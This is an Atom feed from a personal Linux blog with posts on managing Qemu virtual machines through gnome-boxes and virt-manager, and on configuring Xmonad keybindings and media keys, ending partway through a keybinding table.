<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Railslide</title><link href="https://railslide.io/" rel="alternate"></link><link href="https://railslide.io/feeds/all.atom.xml" rel="self"></link><id>https://railslide.io/</id><updated>2024-10-30T00:00:00+01:00</updated><entry><title>Managing virtual machines with Qemu</title><link href="https://railslide.io/managing-virtual-machines-with-qemu.html" rel="alternate"></link><published>2024-10-30T00:00:00+01:00</published><updated>2024-10-30T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2024-10-30:/managing-virtual-machines-with-qemu.html</id><summary type="html">&lt;p&gt;A while ago I switched from Virtualbox to Qemu for virtual machines management. Here are my notes on how to set it up and all the gotchas I stumbled upon while doing it.&lt;/p&gt;</summary><content type="html">&lt;p&gt;A while ago I switched from Virtualbox to Qemu for virtual machines management. Here are my notes on how to set it up and all the gotchas I stumbled upon while doing it.&lt;/p&gt;
&lt;h2&gt;Step 0: check if you can run it&lt;/h2&gt;
&lt;p&gt;First thing first, it might be a good idea to verify that your system supports this kind of virtualization. A quick way to verify is to run&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;grep&lt;span class="w"&gt; &lt;/span&gt;-Ec&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;(vmx|svm)&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/proc/cpuinfo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and check if the output is greater than zero.&lt;/p&gt;
&lt;h2&gt;Gnome-boxes, aka my go-to solution&lt;/h2&gt;
&lt;p&gt;When I first started playing around with Qemu I went for the manual installation (more on that below). Then I discovered gnome-boxes and never looked back. Gnome-boxes basically has everything I need for 99% of my user cases: it is simple stupid to create and manage VMs through it, it automatically resizes the guest screen to fit the host window, transferring files to the VM is super straightforward and it doesn't require you to actually drag-and-drop things.&lt;/p&gt;
&lt;p&gt;Gnome-boxes also allows to download ISO files directly through it. Besides being a nice time-saver (i.e. no more need of switch to browser, download the ISO, import the ISO, etc.), it will also automagically set up copy-paste and file transfer for you!&lt;/p&gt;
&lt;p&gt;Ok, so gnome-boxes sounds great - are there any cons to it? Well, while not dealbreakers, there are definitely a couple of gotchas. First of all, the ISO download function doesn't support all the distros (e.g. Kali cannot be downloaded through it). So if you need one of those, just be aware that - besides getting the ISO file yourself - you'll also have to take care of enabling copy-paste and file transfer on the VM (see below for how to do it).&lt;/p&gt;
&lt;p&gt;Also, while simplicity is definitely one of the strenghts of gnome-boxes, there are cases where you might need more granular control over the settings of your VM. A good example for it is if you are trying to use a distro using Sway as desktop enviroment: default graphical settings don't work in Sway and gnome-boxes doesn't offer a workaround for it. So if you want to run a Sway-based machine, you'll have to install virt-manager and adjust the settings from there (again, see below for how to do it).&lt;/p&gt;
&lt;h2&gt;Manually enable copy-paste &amp;amp; file transfer&lt;/h2&gt;
&lt;p&gt;If the distro you wanted was not in gnome-boxes OS list, you'll need to manually enable up copy-paste and file transfers. To do so, install &lt;code&gt;spice-vdagent&lt;/code&gt; on the guest system. Reboot the VM after installing it and you are good to go.&lt;/p&gt;
&lt;h2&gt;Installing Qemu manually&lt;/h2&gt;
&lt;p&gt;If gnome-boxes is not your thing, you can install Qemu manually. The dark side of it is that the package has different names in different distros (e.g. on Arch it's called &lt;code&gt;qemu-full&lt;/code&gt;, on Ubuntu Jammy is &lt;code&gt;qemu-kvm&lt;/code&gt;, while in newer Ubuntu version is called &lt;code&gt;qemu-system&lt;/code&gt;. So arm yourself of Google, find what's the package is called in your distro and install it with your favorite package manager.&lt;/p&gt;
&lt;p&gt;After that, you'll likely want to install &lt;code&gt;virt-manager&lt;/code&gt; as Qemu doesn't come with a GUI by default.&lt;/p&gt;
&lt;h2&gt;Installing virt-manager&lt;/h2&gt;
&lt;p&gt;First, install the &lt;code&gt;virt-manager&lt;/code&gt; package (which thankfully maintains the same name across distros!) using your distro's package manager.&lt;/p&gt;
&lt;p&gt;In order for &lt;code&gt;virt-manager&lt;/code&gt; to work, your user needs to have access to the &lt;code&gt;libvirtd&lt;/code&gt; daemon and the easiest way to achieve that is to add yourself to the &lt;code&gt;libvirt&lt;/code&gt; user group&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;usermod&lt;span class="w"&gt; &lt;/span&gt;-aG&lt;span class="w"&gt; &lt;/span&gt;libvirt&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$USER&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Next start and enable the &lt;code&gt;libvirt&lt;/code&gt; daemon&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;systemctl&lt;span class="w"&gt; &lt;/span&gt;start&lt;span class="w"&gt; &lt;/span&gt;libvirtd
$&lt;span class="w"&gt; &lt;/span&gt;systemctl&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;enable&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;libvirtd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Launch &lt;code&gt;virt-manager&lt;/code&gt; and if it succesfully connects to Qemu/KVM (you might need to double click on it), you are good to go!&lt;/p&gt;
&lt;h2&gt;VM Gotchas and troubleshooting&lt;/h2&gt;
&lt;p&gt;Creating VMs is pretty straightforward as both gnome-boxes and virt-manager interfaces are extremely intuitive. Tweaking the machines might be a bit more fiddly though, so here's a list of tips and tricks that might come in handy.&lt;/p&gt;
&lt;h3&gt;Sway&lt;/h3&gt;
&lt;p&gt;Sway on Qemu comes with its own specific weird behaviors/bugs.&lt;/p&gt;
&lt;p&gt;In order to prevent the screen from constantly flickering, you will have to manage the VM through virt-manager and change its video settings before installing it. To do so, select the checkbox for customizing configuration (if you forget, you can still reach those settings from Edit -&amp;gt; Preferences on the guest menu), then select &lt;code&gt;Video Virtio&lt;/code&gt; and change the model from &lt;code&gt;Virtio&lt;/code&gt; to &lt;code&gt;VGA&lt;/code&gt; to avoid any graphical glitch.&lt;/p&gt;
&lt;p&gt;Copy-paste and drag-and-drop don't work in Sway. For copy-paste, you can use &lt;a href="https://www.reddit.com/r/swaywm/comments/pg0rqi/clipboard_sharing_using_spicevdagent_not_working/"&gt;&lt;code&gt;xsel&lt;/code&gt; as a workaround&lt;/a&gt;, while for drag-and-drop I have yet to find one.&lt;/p&gt;
&lt;h3&gt;Scaling and resolution on virt-manager&lt;/h3&gt;
&lt;p&gt;After launching the VM, in the guest menu select View -&amp;gt; Scale display -&amp;gt; Always. Select the "Autoresize VM with window" checkbox as well.&lt;/p&gt;
&lt;p&gt;Or even better, you set scaling on all the machines by default by going to Edit -&amp;gt; Preferences -&amp;gt; Console in the host menu.&lt;/p&gt;
&lt;p&gt;Just note that after that you might still need to play around resolution from inside the VM os.&lt;/p&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://apps.gnome.org/Boxes/"&gt;Gnome-boxes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.qemu.org/"&gt;Qemu&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://virt-manager.org/"&gt;Virt-manager&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="dev"></category><category term="virtual-machines"></category><category term="virtualization"></category><category term="qemu"></category><category term="gnome-boxes"></category><category term="virt-manager"></category></entry><entry><title>Xmonad keybindings and media keys</title><link href="https://railslide.io/xmonad-keybindings-and-media-keys.html" rel="alternate"></link><published>2024-02-18T00:00:00+01:00</published><updated>2024-02-18T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2024-02-18:/xmonad-keybindings-and-media-keys.html</id><summary type="html">&lt;p&gt;How to set up keybindings and make media keys work in Xmonad&lt;/p&gt;</summary><content type="html">&lt;p&gt;One of the first things I wanted to get to work once I installed Xmonad were the media keys. I use music as a way to concentrate when coding and having to go through the hassle of finding the player window, reaching for my mouse, and clicking on the control buttons is a waste of time and focus. So controlling playback from my keyboard is a must.&lt;/p&gt;
&lt;p&gt;However Xmonad doesn't support media keys out of the box, so in order to have them working I had to define some keybindings.&lt;/p&gt;
&lt;h2&gt;How keybindings work&lt;/h2&gt;
&lt;p&gt;First I had to import the &lt;code&gt;XMonad.Util.EZConfig&lt;/code&gt; module at the top of my config.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;XMonad.Util.EZConfig&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code&gt;XMonad.Util.EZConfig&lt;/code&gt; includes &lt;code&gt;additionalKeys&lt;/code&gt; which can be used to define keybindings. The syntax is the following&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;myKeyBindings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;mod1Mask&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xK_f&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;firefox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;-- mod+f launches Firefox&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;noModMask&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xK_Print&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;scrot -s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;-- PrtScr takes a screenshot&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="nf"&gt;myConfig&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;def&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;terminal&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myTerminal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;modMask&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myModMask&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;startupHook&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myStartupHook&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;`&lt;/span&gt;&lt;span class="n"&gt;additionalKeys&lt;/span&gt;&lt;span class="p"&gt;`&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myKeyBindings&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;where &lt;code&gt;noModMask&lt;/code&gt; is used for when you don't need a modifier, like in the example above where &lt;kdb&gt;PrtScr&lt;/kbd&gt; is all you need to press in order to take a screenshot.&lt;/p&gt;
&lt;p&gt;While that certainly works, it's not exactly the most straightforward syntax. Thankfully the very same module also includes &lt;code&gt;additionalKeysP&lt;/code&gt;, which helps solving exactly that. According to the docs, it uses &lt;em&gt;"Emacs-style keybinding specifications"&lt;/em&gt;, which I would have rather called human-friendly specifications but I guess that wasn't equally catchy.&lt;/p&gt;
&lt;p&gt;So with the new syntax, the config becomes&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;myKeyBindings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;M-f&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;firefox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;Print&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;scrot -s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;

&lt;span class="n"&gt;myConfig&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;def&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;terminal&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myTerminal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;modMask&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myModMask&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;startupHook&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myStartupHook&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n n-Quoted"&gt;`additionalKeysP`&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myKeyBindings&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Much better! A full list of the supported special keys can be found in &lt;a href="https://hackage.haskell.org/package/xmonad-contrib-0.18.0/docs/XMonad-Util-EZConfig.html#g:3"&gt;Xmonad docs&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Setting media keys up&lt;/h2&gt;
&lt;p&gt;Next was to set up media keys. In order for them to work, besides a keybinding, I also needed something to control the currently active player. For that I installed &lt;code&gt;playerctl&lt;/code&gt; which worked great both from my keyboard and from my headphones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;myKeyBindings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;M-f&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;firefox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;Print&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;scrot -s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;-- Media keys&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;XF86AudioPlay&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;playerctl play-pause&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;XF86AudioNext&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;playerctl next&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;XF86AudioPrev&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;playerctl previous&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Note that if you are using &lt;code&gt;additionalKeys&lt;/code&gt;, you will have to import &lt;code&gt;Graphics.X11.ExtraTypes.XF86&lt;/code&gt; in order to use &lt;code&gt;xF86XK_AudioPlay&lt;/code&gt; and co.&lt;/p&gt;
&lt;h2&gt;Resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://xmonad.org/TUTORIAL.html"&gt;Xmonad configuration tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackage.haskell.org/package/xmonad-contrib-0.18.0/docs/XMonad-Util-EZConfig.html"&gt;XMonad.Util.EZConfig docs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="tiling-window-managers"></category><category term="xmonad"></category></entry><entry><title>Exploring xmonad: Getting started</title><link href="https://railslide.io/exploring-xmonad-getting-started.html" rel="alternate"></link><published>2024-02-05T00:00:00+01:00</published><updated>2024-02-05T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2024-02-05:/exploring-xmonad-getting-started.html</id><summary type="html">&lt;p&gt;The first of a series of articles about exploring xmonad and trying to wrap my head around Haskell.&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is the first article of a series about my experience with setting up xmonad. The idea is to keep track of my journey and to write some handy guides for either someone who might be curious about xmonad as well and/or my future self.&lt;/p&gt;
&lt;h2&gt;Installing all the things&lt;/h2&gt;
&lt;p&gt;What a better place for starting than installing xmonad?&lt;/p&gt;
&lt;p&gt;Ideally you want to install the following&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xmonad&lt;/code&gt; (duh!)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xmonad-contrib&lt;/code&gt;, xmonad extensions (you can't do much without it!)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dmenu&lt;/code&gt;, launcher/menu for applications&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xterm&lt;/code&gt;, xmonad default terminal emulator. You can switch to your favourite emulator later, but it's good to have xterm available as a fallback.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For Arch, I installed all the above via Yay/Pacman and then added a &lt;a href="https://wiki.archlinux.org/title/Xmonad#Problems_with_finding_shared_libraries_after_update"&gt;Pacman hook&lt;/a&gt; to avoid future headaches when updating.&lt;/p&gt;
&lt;h2&gt;Basic configuration&lt;/h2&gt;
&lt;p&gt;Next I created a basic config file. You don't necessarily need one, but I wanted to customize a couple of things already from the start.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;XMonad&lt;/span&gt;

&lt;span class="nf"&gt;myModMask&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mod4Mask&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;-- Use Super as the mod key&lt;/span&gt;
&lt;span class="nf"&gt;myTerminal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;alacritty&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;-- Actions to perform whenever xmonad starts or is restarted&lt;/span&gt;
&lt;span class="nf"&gt;myStartupHook&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;do&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;setxkbmap -layout us&amp;quot;&lt;/span&gt;

&lt;span class="nf"&gt;myConfig&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;def&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;terminal&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myTerminal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;modMask&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myModMask&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;startupHook&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myStartupHook&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;-- Run xmonad with the settings specified above&lt;/span&gt;
&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;::&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;IO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;()&lt;/span&gt;
&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xmonad&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;myConfig&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and saved it into &lt;code&gt;~/.xmonad/xmonad.hs&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Note that the above configuration will not work with xmonad&amp;lt;0.17.&lt;/p&gt;
&lt;p&gt;It's also worth nothing that the location of the config might vary. According to xmonad doc it should go into &lt;code&gt;~/.config/xmonad/xmonad.hs&lt;/code&gt;, which however didn't work for me (thankfully I had xterm installed, otherwise I wouldn't have been able to do anything once I logged into xmonad!). Arch wiki tells you instead to place it into &lt;code&gt;~/.xmonad/xmonad.hs&lt;/code&gt;, which in my case resulted in the config being picked up correctly.&lt;/p&gt;
&lt;h2&gt;Getting around in xmonad&lt;/h2&gt;
&lt;p&gt;Next is to log into xmonad and test if the config is loaded correctly.&lt;/p&gt;
&lt;p&gt;If &lt;code&gt;Super+Shift+Enter&lt;/code&gt; launches Alacritty, you're good to go. If not, try moving the config to a different location (see above).&lt;/p&gt;
&lt;p&gt;Here are a list of useful keybindings to start with&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Keybinding&lt;/th&gt;
&lt;th&gt;Action&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;kbd&gt;mod&lt;/kbd&gt; &lt;kbd&gt;shift&lt;/kbd&gt; &lt;kbd&gt;return&lt;/kbd&gt;&lt;/td&gt;
&lt;td&gt;Launch terminal&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;kbd&gt;mod&lt;/kbd&gt; &lt;kbd&gt;p&lt;/kbd&gt;&lt;/td&gt;
&lt;td&gt;Launch dmenu&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;kbd&gt;mod&lt;/kbd&gt; &lt;kbd&gt;shift&lt;/kbd&gt; &lt;kbd&gt;c&lt;/kbd&gt;&lt;/td&gt;
&lt;td&gt;Close the focused window&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;kbd&gt;mod&lt;/kbd&gt; &lt;kbd&gt;shift&lt;/kbd&gt; &lt;kbd&gt;q&lt;/kbd&gt;&lt;/td&gt;
